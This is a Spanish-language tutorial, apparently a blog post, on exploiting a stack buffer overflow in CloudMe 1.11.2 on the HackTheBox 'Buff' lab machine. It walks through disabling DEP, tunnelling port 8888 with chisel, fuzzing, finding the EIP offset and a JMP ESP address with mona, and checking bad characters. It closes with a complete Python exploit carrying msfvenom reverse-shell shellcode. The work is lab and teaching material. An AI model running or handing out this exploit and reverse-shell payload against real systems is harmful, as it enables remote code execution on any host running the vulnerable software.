---
title: Explotación Básica de un Buffer OverFlow (BoF)
description: Se explicará que es el Buffer OverFlow, cómo se explota y cómo un atacante puede aprovecharlo para ejecutar comandos.
date: 2024-11-28
categories: [buffer-overflow]
tags: [bof, buffer, mona, immunity-debugger, buff, binario, pattern_create, pattern_offset, nasm_shell, eip, esp, binario, jmp_esp, offset shell_code, bad_chars, direcciones_de_memoria, little_endian, msfvenom, windows, nop, reverse_shell]
img_path: /assets/img/desbordamiento-del-bufer.png
image: /assets/img/desbordamiento-del-bufer.png
---

## **Introducción**

Un **Buffer OverFlow** (desbordamiento de búfer) ocurre cuando un programa escribe más datos en un área de memoria (el "búfer") de lo que esta puede manejar. Como resultado, los datos adicionales "**desbordan**" a áreas de memoria adyacentes, lo que puede causar comportamientos inesperados, errores en el programa o incluso **ser aprovechado para ejecutar código malicioso**.

En este artículo, estaremos explotando el binario *CloudMe_1112.exe* que se encuentra en la máquina [Buff](https://app.hackthebox.com/machines/Buff) de [HackTheBox](https://app.hackthebox.com/) una vez que consigues acceso a ella. Además de la máquina de atacantes, deberemos tener una máquina *Windows 7* o *Windows 10* con la aplicación *Immunity Debugger* instalado. En mi caso, poseo una *Windows 10 Pro*.

## **Preparación del entorno**

Una vez que tenemos todo preparado, deberemos de transferirnos el binario de *CloudMe_1112.exe* que se encuentra en la máquina víctima a nuestra máquina *Windows*.

![cloudme e immunity debugger instalados en la maquina windows 10](/assets/img/cloudme-e-immunity-debugger-instalados-en-la-maquina-windows-10.png)

Cuando lo tengamos instalado, vamos a tener que deshabilitar *DEP* para poder ejecutar comandos directamente en la pila. Para ello seguiremos los siguiente pasos.

 ➜ Abrimos una consola (*cmd*) con permisos de *Administrador*.<br>
 ➜ Ejecutamos el comando `bcdedit.exe /set {current} nx AlwaysOff`.<br>
 ➜ *Reiniciamos* el equipo.<br>

>La *prevención de ejecución de datos* (*DEP*) es una característica de *protección de memoria* de nivel de sistema integrada en el sistema operativo a partir de Windows XP y Windows Server 2003. DEP permite al sistema marcar una o varias páginas de memoria como *no ejecutables*.

Adicionalmente, instalaremos `mona.py` para poder obtener y analizar diferentes partes del binario. 

 ➜ *Creamos un fichero* con nombre `mona.py` en el escritorio.<br>
 ➜ Nos *descargamos* el [script de mona](https://raw.githubusercontent.com/corelan/mona/master/mona.py) en python3 y lo metemos en el fichero `mona.py`.<br>
 ➜ En el escritorio pulsamos `shift + click derecho` + *Open command windows here*, para abrir una *consola en el escritorio*.<br>
 ➜ *Renombraremos* el fichero `mona.py.txt` a `mona.py` con el comando `ren mona.py.txt mona.py`.<br>
 ➜ Desde la *consola como administrador* ejecutaremos el comando `mv mona.py "C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands"` para que *Immunity Debugger* pueda reconocer el comando `mona` en caso de que lo ejecutemos.<br>

Con todo esto configurado, deberíamos de tener un entorno perfectamente funcional para realizar el siguiente artículo.

## **Contexto**

Nosotros como atacantes, hemos identificado una aplicación que está corriendo internamente en la máquina víctima (*CloudMe_1112.exe*) el cual, tenemos el binario para poder realizar pruebas externamente sin dañar la integridad de la víctima. Como atacantes, deberemos de probar si este binario es vulnerable a un **Buffer OverFlow** y/o tiene alguna vulnerabilidad y, para ello, nos lo deberemos de traer a una máquina externa con la que hacer pruebas.

En esta máquina externa (*Windows 10 con el Immunity Debugger instalado*) estaremos continuamente iniciando el binario cada vez que deje de responder, debido a las pruebas que estamos realizando. Desde nuestra máquina de atacantes, estaremos creándonos el script encargado de efectuar ese *BoF* hacia el binario vulnerable. Ahora que hemos entendido esto, nos pondremos manos a la obra.

## **Manos a la obra**

### **Análisis del binario e identificación de la vulnerabilidad**

Si nos fijamos en el puerto que nos abre a la hora de ejecutar el binario de *CloudMe_1112.exe*, nos encontramos con el puerto *8888* el cual, está escuchando internamente por el *localhost*. Este puerto, es el que usa para la comunicación de la aplicación con el sistema operativo.

```powershell
netstat -nat | findstr /I "8888"
```

![netstat filtrando por el puerto 8888 de cloudme](/assets/img/netstat-filtrando-por-el-puerto-8888-de-cloudme.png)

Al ser un puerto interno, necesitamos usar `chisel` para poder comunicarnos con este externamente por lo que, nos traeremos el binario de `chisel.exe` a la máquina víctima y montaremos el servidor para que nuestro cliente se conecte de forma que, el puerto *8888* de la máquina *Windows 10* sea nuestro puerto *8888*.

Desde nuestra máquina de atacantes, montaremos el servidor.

```bash
./chisel server --reverse -p 1234 --socks5
```

![chisel server en la maquina de atacantes para traernos el puerto 8888 de la windows](/assets/img/chisel-server-en-la-maquina-de-atacantes-para-traernos-el-puerto-8888-de-la-windows.png)

Después, nos conectaremos como clientes a nuestra máquina de atacantes.

```powershell
chisel.exe client NUESTRA_IP:1234 R:127.0.0.1:8888
```

![conexion chisel cliente desde windows 10](/assets/img/conexion-chisel-cliente-desde-windows-10.png)

Una vez ejecutada la conexión del cliente, el puerto *8888* de la máquina *Windows* es ahora, nuestro puerto *8888*.

![chisel servidor con la conexion del cliente windows 10](/assets/img/chisel-servidor-con-la-conexion-del-cliente-windows-10.png)

Podemos ver que la conexión se ha realizado correctamente por lo que ahora debemos de configurar nuestro `/etc/proxychains4.conf`. 

![proxy socks5 para permitir la conexion al puerto 8888 de la maquina windows 10](/assets/img/proxy-socks5-para-permitir-la-conexion-al-puerto-8888-de-la-maquina-windows-10.png)

En este momento, si hacemos un escaneo a nuestra propia máquina por su puerto *8888*, veremos que está abierto.

```bash
sudo nmap -p8888 -Pn -sS -n -vvv 127.0.0.1
```

![nuestro puerto 8888 abierto gracias al chisel](/assets/img/nuestro-puerto-8888-abierto-gracias-al-chisel.png)

Es a través de este puerto, con el que vamos a podernos comunicar con la aplicación *CloudMe*. Si quieres aprender más sobre `chisel` puedes visitar mi otro artículo sobre [Pivoting con Chisel](https://h3g0c1v.github.io/posts/pivoting-chisel/).

Cuando una aplicación es programada, hay veces en los cuales, el búfer de la memoria no es bien validado. Si un atacante llega a meter un contenido mayor al búfer definido, estará pasando lo que se conoce como un **desbordamiento del búfer**. Para validar si el binario es vulnerable, deberemos de obtener el *offset* necesario en el que la memoria es sobreescrita y la aplicación se corrompe.

Para analizar el comportamiento de la aplicación, tenemos *Immunity Debugger*. Primeramente, iniciaremos la aplicación.

![Aplicacion de cloudme ejecutada](/assets/img/Aplicacion-de-cloudme-ejecutada.png)

Después, ejecutaremos *Immunity Debugger* con permisos de administrador y adjuntaremos el proceso en el que *CloudMe* se está ejecutando. Para ello, seleccionaremos `File + Attach` para ver los procesos en ejecución.

![file attach opcion immunity debugger](/assets/img/file-attach-opcion-immunity-debugger.png)

Seguidamente, seleccionaremos el proceso en el que *CloudMe* está en ejecución.

![proceso de cloudme](/assets/img/proceso-de-cloudme.png)

En este momento, la aplicación se cargará en *Immunity Debugger*, sin embargo, una vez que esté procesada se quedará en estado *Paused* es decir, la aplicación actualmente no está realizando ninguna operación. Para correr la aplicación, seleccionaremos el botón de *play* de la parte superior.

![corriendo el script](/assets/img/corriendo-el-script.png)

Podemos ver el estado de la aplicación en todo momento en la parte inferior derecha de *Immunity Debugger*. Como ahora la hemos iniciado, debería de estar en estado *Running*.

![estado running de la aplicacion en immunity debugger](/assets/img/estado-running-de-la-aplicacion-en-immunity-debugger.png)

Para enviar datos a la aplicación, usaremos `nc`, con el que nos conectaremos a esta por el puerto *8888*. Una vez conectados, enviaremos múltiples caracteres "A" (puede ser cualquier tipo de caracter) a la aplicación.

```bash
nc 127.0.0.1 8888
```

![enviando 1500 aes al binario por el puerto 8888](/assets/img/enviando-1500-aes-al-binario-por-el-puerto-8888.png)

En la imagen anterior, se han enviado *1500* "*A*" sobre la aplicación. Si nos dirigimos al *Windows 10* donde tenemos el *Immunity Debugger* monitorizando el comportamiento de la aplicación, observaremos que en la parte izquierda ya no nos aparece nada ya que el programa se ha corrompido. En la parte derecha, vemos los registros de la memoria del programa y, si nos fijamos en ellos, nos daremos cuenta de que la mayoría de ellos tienen el carácter hexadecimal *0x41*.

![registros de la memoria en immunity debugger](/assets/img/registros-de-la-memoria-en-immunity-debugger.png)

La representación *0x41* en *ASCII* corresponde a la letra *A* que es, justamente, el carácter que hemos introducido múltiples veces. Al observar esto, hemos conseguido identificar que el binario *CloudMe* tiene la vulnerabilidad de *desbordamiento del búfer* o *Buffer OverFlow* (*BoF*). Si abrimos el programa de *CloudMe* veremos como se ha corrompido y se nos ha cerrado automáticamente.

## **Obtención del offset**

En este punto, ya deberíamos de estar pensando en intentar ejecutar código, como una *reverse shell*, directamente en la pila. Para ello, tenemos que empezar sacando el *offset* exacto antes de llegar a sobreescribir el registro *EIP*.

En *Kali Linux* y *Parrot OS* contamos con dos herramientas de `metasploit` llamadas:

 ➜ `pattern_create.rb`<br>
 ➜ `pattern_offset.rb`<br>

Ambas herramientas, nos ayudarán a obtener el *offset* exacto. Con `pattern_create` generaremos un patrón especialmente diseñado para después, con `pattern_offset` obtener la posición exacta en el que se encuentra la cadena que le introduzcamos. Esto es mejor que lo veamos en la práctica así que, volvemos a abrir el programa vulnerable y a adjuntar el proceso de este a *Immunity Debugger*.

Crearemos un patrón de *1500* caracteres con `pattern_create`.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
```

![creando patron de 1500 caracteres](/assets/img/creando-patron-de-1500-caracteres.png)

Este patron, lo enviaremos directamente con `nc` a la aplicación.

```bash
nc 127.0.0.1 8888
```

![envio del patron disenado con pattern_create](/assets/img/envio-del-patron-disenado-con-pattern_create.png)

Nos volvemos al *Windows 10* para analizar lo que ha pasado y vemos que ha vuelto a desbordarse el búfer, sin embargo, esta vez el valor de *EIP* NO vale *0x41* si no *0x316A4230* que corresponde a alguna parte del patrón que hemos enviado.

Para saber en que posición está esta cadena, usaremos el script `pattern_offset.rb` seguido del parámetro `-q` en el que le indicaremos el valor de *EIP*.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230
```

![obteniendo el valor del offset](/assets/img/obteniendo-el-valor-del-offset.png)

En este punto, ya sabemos que el offset que hay justo antes de llegar a sobreescribir el *EIP* es de *1052* caracteres. Podemos comprobar esto, enviando *1052* caracteres y justamente seguido *4* "*B*".

```python
"A"*1052 + "B"*4
```

![generando de nuevo un patron pero con el offset de aes y 4 b](/assets/img/generando-de-nuevo-un-patron-pero-con-el-offset-de-aes-y-4-b.png)

Una vez generada la cadena se la enviaremos al programa, que deberemos de volver e abrirlo y adjuntarlo en *Immunity Debugger*.

![valor de eip 4 b en hexadecimal](/assets/img/valor-de-eip-4-b-en-hexadecimal.png)

El valor de *EIP* vale las *4* "*B*" que hemos enviado y justamente todos los valores anteriores serán las *1052* "*A*" restantes.

## **Definiendo la estructura inicial del script**

Vamos a empezar a crear nuestro pequeño script en *Python3* que nos ayudará a explotar el *BoF*.

```python
# Librerias
import socket

# Variables Globales
ip = "127.0.0.1" # Dirección IP destino
port = 8888 # Puerto destino

offset = b"A"*1052 # Definiendo el offset antes de llegar al EIP
eip = b"B"*4 # Contenido de EIP

# Funcion encargada de explotar el BoF
def bof():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creando la conexión
	s.connect((ip, port)) # Conectandonos a la aplicación (ip:port)

	payload = offset + eip # Definiendo el payload a enviar a la aplicación

	s.send(payload) # Enviando el payload

# Funcion Main
if __name__ == '__main__':
	bof() # Funcion encargada de explotar el BoF
```

Este script inicial, nos servirá para no tener que conectarnos continuamente con `nc` y enviar el *payload*. Lo tendremos que ir modificando cada vez que vayamos descubriendo nuevos valores.

## **En busca de la instrucción de memoria JMP ESP**

Lo siguiente que tenemos que hacer es, encontrar un registro que como valor tenga la instrucción `jmp esp`. El registro *EIP* es el encargado de definir cual es la siguiente dirección de memoria a la que el programa va a ir es decir, si en el *EIP* hay una dirección de memoria que tiene como instrucción un `jmp esp`, como esta instrucción lo que hace es ir directamente al registro *ESP* (pila), el programa lo siguiente que hará es ir a la *pila*. Entonces, si lo siguiente que hace el programa es ir a la pila, podremos indicar el comando que queramos que se ejecute, como por ejemplo, una *reverse shell*.

Para obtener una dirección de memoria que corresponda a un `jmp esp`, tenemos que saber cual es el valor que le identifica a este tipo de instrucciones de memoria. Podemos visualizar el valor que tendría una dirección de memoria de tipo `jmp esp` con la utilidad `nasm_shell.rb`.

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```

![valor correspondiente a jmp esp con nasm_shell](/assets/img/valor-correspondiente-a-jmp-esp-con-nasm_shell.png)

Obtenemos que el valor de una instrucción `jmp esp` es *FFE4* así que esto, es lo que tenemos que buscar. Vamos a ver los módulos disponibles con `mona`.

```c
!mona modules
```

![mona modules immunity debugger](/assets/img/mona-modules-immunity-debugger.png)

En este listado que nos va a mostrar, tenemos que buscar cualquier fila que tenga cada una de sus columnas en *False* por ejemplo, el `Qt5Gui.dll`.

![listado de modulos con todas las columnas en false](/assets/img/listado-de-modulos-con-todas-las-columnas-en-false.png)

Esto significa que, este módulo no tiene ninguna protección. Hemos encontrado el de *Qt5Gui.dll*, sin embargo, podríamos haber cogido cualquier otro que tenga cada una de sus columnas en *False*. Sobre este módulo, nos quedaremos con el nombre del binario, en este caso *Qt5Gui.dll* y buscaremos instrucciones de memoria `jmp esp` sobre este.

```c
!mona find -s "\xFF\E4" -m Qt5Gui.dll
```

![buscando instrucciones jmp esp sobre el registro escogido en el mona modules](/assets/img/buscando-instrucciones-jmp-esp-sobre-el-registro-escogido-en-el-mona-modules.png)

Todos estos *46 resultados* que nos ha mostrado el comando, son direcciones de memoria en los cuales, se encuentra la instrucción `jmp esp`. De este listado, podemos coger cualquiera de ellos ya que, todos y cada uno de ellos, contiene la instrucción que necesitamos.

![direccion de memoria copiada en el portapapeles](/assets/img/direccion-de-memoria-copiada-en-el-portapapeles.png)

Una vez escogido el deseado, copiaremos su dirección de memoria. Para comprobar que realmente es una dirección de memoria que contiene un `jmp esp` y no es un falto positivo, seleccionaremos el siguiente botón en la parte superior y escribiremos la dirección de memoria que hemos copiado.

![comprobando que la direccion de memoria es realmente un jmp esp](/assets/img/comprobando-que-la-direccion-de-memoria-es-realmente-un-jmp-esp.png)

Una vez buscada, nos dirigirá a dicha dirección de memoria y deberemos de ver que realmente es un `jmp esp`.

![la direccion de memoria es realmente un jmp esp](/assets/img/la-direccion-de-memoria-es-realmente-un-jmp-esp.png)

Este valor, tenemos que añadirlo a las variables del script sin embargo, debe de estar en un formato especial, en *little endian*. Para ello, usaremos la librería `struct` con el fin de representarlo de manera correcta. 

```python
from struct import pack
```

A continuación, modificaremos la variable `eip` para añadir la dirección de memoria escogida y la representaremos de la manera adecuada.

```python
eip = pack("<L", 0x61FFBA23) # Direccion de memoria JMP ESP representada en little endian
```

Entonces, si ejecutamos el script para enviar nuevamente el payload, observaremos que el valor de *EIP* es igual al del *ESP* debido a que, como el *EIP* contiene una instrucción `jmp esp`, lo siguiente que hará es dirigirse a la dirección de memoria del *ESP*.

## **Generación del shellcode**

En este punto, podemos generar nuestro *shellcode* el cual, se va a encargar de enviarnos una consola a nuestra máquina de atacantes. Algo que hay que tener en cuenta es, que cada binario tiene sus *bad chars* es decir, caracteres que no reconoce y no los interpreta correctamente. Esto es importante, ya que si generamos un *shellcode* con algún *bad char* no se interpretará correctamente y no funcionará el exploit.

Configuraremos un entorno de trabajo con el comando que se muestra a continuación.

```c
!mona config -set workingfolder C:\Users\USUARIO\Desktop\
```

![configurando un entorno de trabajo](/assets/img/configurando-un-entorno-de-trabajo.png)

Seguidamente, generaremos un array de bytes el cual, NO contenga el byte *\x00*. Este, es uno de los que la mayoría de veces es conflictivo, por lo que nos ahorraremos este primer paso.

```c
!mona bytearray -cpb "\x00"
```

![generacion de array de bytes para la generacion correcto del shell code](/assets/img/generacion-de-array-de-bytes-para-la-generacion-correcto-del-shell-code.png)

Esto, nos habrá generado un fichero `bytearray.txt` en nuestro directorio de trabajo con el contenido de todos los bytes que estamos viendo en la imagen anterior, pero sin el byte *\x00*.

![generacion de array de bytes en fichero txt](/assets/img/generacion-de-array-de-bytes-en-fichero-txt.png)

Esto, lo deberemos de meter en el *shellcode* a enviar. Modificaremos el script para que contenga este array de bytes y empezaremos añadiendo la variable que contiene este *shellcode*.

```python
shell_code = ( # Definiendo el shell code que nos enviara la reverse shell
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```

Después, añadiremos esta variable al payload a enviar.

```python
payload = offset + eip + shell_code # Definiendo el payload a enviar a la aplicación
```

Con esto modificado, volveremos a ejecutar el script en *Python3* para ver si en este array de bytes hay algún *bad chars* extra. Para comprobar si hay algún *bad char*, el comando a ejecutar en *Immunity Debugger* una vez ejecutado el script en *Python3* es el siguiente.

```c
!mona compare -a DIRECCION_ESP -f bytearray.bin
```

Donde *DIRECCION_ESP* corresponde a la dirección del *ESP* que se muestra en *Immunity Debugger*.

![direccion del esp actualmente](/assets/img/direccion-del-esp-actualmente.png)

En mi caso, esta dirección es la *00A3AA30* por lo que el comando que tendría que ejecutar yo es el de a continuación.

```c
!mona compare -a 0x00A3AA30 -f bytearray.bin
```

Como no hay ningún *bad char*, nos muestra la columna *BadChars* vacía.

![vemos que no hay ningun bad char adicional](/assets/img/vemos-que-no-hay-ningun-bad-char-adicional.png)

> Si hubiera alguno, tendríamos que volver a repetir el proceso pero, a la hora de generar el array de bytes, tendríamos que añadir el nuevo *bad char* que se nos haya mostrado en esta columna. Por ejemplo, si el programa detecta como *bad char* el *\0x01*, generaremos el array de bytes con el comando `!mona bytearray -cpb "\x00\x01"` y así con cada *bad char* que nos vaya saliendo.

Como no ha encontrado ningún *bad char* adicional, podemos proseguir con la generación del *shellcode* el cual, nos enviará una consola a nuestra máquina de atacantes. La *reverse shell* la generaremos con `msfvenom`.

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai LHOST=NUESTRA_IP LPORT=NUESTRO_PUERTO -b "\x00" EXITFUND=thread -f c
```

![generacion de la reverse shell con los bad chars correspondientes](/assets/img/generacion-de-la-reverse-shell-con-los-bad-chars-correspondientes.png)

El contenido generado por `msfvenom` lo reemplazaremos por el *shellcode* dentro del script.

## **Not Operation Code (NOP)**

En principio, ya estaría listo para ejecutarse, pero hay un detalle adicional que debemos tener en cuenta. Antes de que el *shellcode* se ejecute, hay que dar un tiempo al programa para que termine las tareas anteriores que tenga pendientes de hacer. Para hacer esto, tenemos lo que se le llaman *Not Operation Code* (*NOP*) 

Los *Not Operation Code* o *NOP*, son instrucciones en ensamblador que no realizan ninguna acción significativa durante la ejecución de un programa, más allá de consumir un ciclo de reloj del procesador o un pequeño espacio en la memoria. El valor con el que se le representa es el *0x90* y antes de ejecutar el *shellcode* habría que añadir unos cuantos *NOP* para que se ejecute correctamente y nos envíe la *reverse shell* correctamente. 

## **Consiguiendo acceso a la máquina víctima**

El script final, quedaría de la siguiente manera.

```python
# Librerias
import socket
from struct import pack

# Variables Globales
ip = "127.0.0.1" # Dirección IP destino
port = 8888 # Puerto destino

offset = b"A"*1052 # Definiendo el offset antes de llegar al EIP
eip = pack("<L", 0x006E3D7F) # Direccion de memoria JMP ESP representada en little endian
shell_code = ( # Definiendo el shell code que nos enviara la reverse shell
b"\xd9\xe9\xd9\x74\x24\xf4\x5e\x29\xc9\xba\x50\x4b\x82\xe9"
b"\xb1\x52\x83\xee\xfc\x31\x56\x13\x03\x06\x58\x60\x1c\x5a"
b"\xb6\xe6\xdf\xa2\x47\x87\x56\x47\x76\x87\x0d\x0c\x29\x37"
b"\x45\x40\xc6\xbc\x0b\x70\x5d\xb0\x83\x77\xd6\x7f\xf2\xb6"
b"\xe7\x2c\xc6\xd9\x6b\x2f\x1b\x39\x55\xe0\x6e\x38\x92\x1d"
b"\x82\x68\x4b\x69\x31\x9c\xf8\x27\x8a\x17\xb2\xa6\x8a\xc4"
b"\x03\xc8\xbb\x5b\x1f\x93\x1b\x5a\xcc\xaf\x15\x44\x11\x95"
b"\xec\xff\xe1\x61\xef\x29\x38\x89\x5c\x14\xf4\x78\x9c\x51"
b"\x33\x63\xeb\xab\x47\x1e\xec\x68\x35\xc4\x79\x6a\x9d\x8f"
b"\xda\x56\x1f\x43\xbc\x1d\x13\x28\xca\x79\x30\xaf\x1f\xf2"
b"\x4c\x24\x9e\xd4\xc4\x7e\x85\xf0\x8d\x25\xa4\xa1\x6b\x8b"
b"\xd9\xb1\xd3\x74\x7c\xba\xfe\x61\x0d\xe1\x96\x46\x3c\x19"
b"\x67\xc1\x37\x6a\x55\x4e\xec\xe4\xd5\x07\x2a\xf3\x1a\x32"
b"\x8a\x6b\xe5\xbd\xeb\xa2\x22\xe9\xbb\xdc\x83\x92\x57\x1c"
b"\x2b\x47\xf7\x4c\x83\x38\xb8\x3c\x63\xe9\x50\x56\x6c\xd6"
b"\x41\x59\xa6\x7f\xeb\xa0\x21\x40\x44\x5e\x37\x28\x97\x9e"
b"\x39\x12\x1e\x78\x53\x74\x77\xd3\xcc\xed\xd2\xaf\x6d\xf1"
b"\xc8\xca\xae\x79\xff\x2b\x60\x8a\x8a\x3f\x15\x7a\xc1\x1d"
b"\xb0\x85\xff\x09\x5e\x17\x64\xc9\x29\x04\x33\x9e\x7e\xfa"
b"\x4a\x4a\x93\xa5\xe4\x68\x6e\x33\xce\x28\xb5\x80\xd1\xb1"
b"\x38\xbc\xf5\xa1\x84\x3d\xb2\x95\x58\x68\x6c\x43\x1f\xc2"
b"\xde\x3d\xc9\xb9\x88\xa9\x8c\xf1\x0a\xaf\x90\xdf\xfc\x4f"
b"\x20\xb6\xb8\x70\x8d\x5e\x4d\x09\xf3\xfe\xb2\xc0\xb7\x0f"
b"\xf9\x48\x91\x87\xa4\x19\xa3\xc5\x56\xf4\xe0\xf3\xd4\xfc"
b"\x98\x07\xc4\x75\x9c\x4c\x42\x66\xec\xdd\x27\x88\x43\xdd"
b"\x6d"
)

# Funcion encargada de explotar el BoF
def bof():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Creando la conexión
	s.connect((ip, port)) # Conectandonos a la aplicación (ip:port)

	payload = offset + eip + b"\x90"*11 + shell_code # Definiendo el payload a enviar a la aplicación

	s.send(payload) # Enviando el payload

# Funcion Main
if __name__ == '__main__':
	bof() # Funcion encargada de explotar el BoF
```

Nos pondríamos en escucha por el puerto indicado en la creación de la *reverse shell* con `msfvenom` y ejecutaríamos el script con el programa *CloudMe* iniciado en la máquina *Windows*.

![consiguiendo acceso a la maquina victima](/assets/img/consiguiendo-acceso-a-la-maquina-victima.png)

Hemos logrado que el script funcione y nos proporcione una _reverse shell_. Sin embargo, tenemos que conseguir ejecutarlo exitosamente en la máquina víctima real, ya que hasta ahora hemos estado realizando las pruebas en una máquina _Windows_ local. Lo único que debemos ajustar sobre este script es la generación de la _reverse shell_. En esta ocasión, debemos configurar la dirección _IP_ con la de la _VPN_ asignada al conectarnos a _HTB_.

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai LHOST=NUESTRA_IP_HTB LPORT=NUESTRO_PUERTO -b "\x00" EXITFUND=thread -f c
```

Por último, nos traeremos el puerto *8888* de la máquina víctima para que sea nuestro puerto *8888*, con el mismo comando ejecutado anteriormente.

```powershell
chisel.exe client NUESTRA_IP_HTB:1234 R:127.0.0.1:8888
```

![chisel cliente servidor maquina buff puerto 8888](/assets/img/chisel-cliente-servidor-maquina-buff-puerto-8888.png)

Ahora, ejecutaremos de nuevo el script con la pequeña modificación anterior y observaremos como obtenemos acceso a la máquina víctima.

![buffer overflow acontecido conexion remota de buff a nuestra maquina de atacantes](/assets/img/buffer-overflow-acontecido-conexion-remota-de-buff-a-nuestra-maquina-de-atacantes.png)

Esta, es una explotación básica de un *Buffer OverFlow*.

## *Despedida*

Se que el *BoF* puede ser abrumador al principio pero, cuanto más practiques este tipo de explotaciones, más ameno se te va a ir haciendo el aprendizaje. ¡No te rindas nunca!
